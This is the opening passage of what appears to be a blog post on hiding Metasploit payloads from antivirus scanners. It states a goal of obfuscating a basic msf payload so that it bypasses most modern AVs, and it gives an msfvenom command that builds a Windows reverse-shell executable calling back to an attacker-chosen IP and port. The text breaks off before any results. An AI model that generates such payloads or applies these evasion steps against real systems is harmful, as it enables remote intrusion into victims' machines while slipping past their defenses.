## Introduction 

Avs have significantly improved in recent years it still relies on age-old AV techniques that are often trivial to bypass. In this post weâ€™ll analyse some basic pool of techniques which can be used to protect a basic msf payload to bypass most modern Avs. 

## Ways to hide msf payloads
In the following we will explore ways to encode/obfuscate msf payload and will have a goal to finally reach a point where we are satisfied with our results.

### Basic msf payload
Lets see how our basic msf payload stand againt Virustotal.

- Build command
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip here> LPORT=<port here> -f exe -o shivang_shell.ex
```

- Result
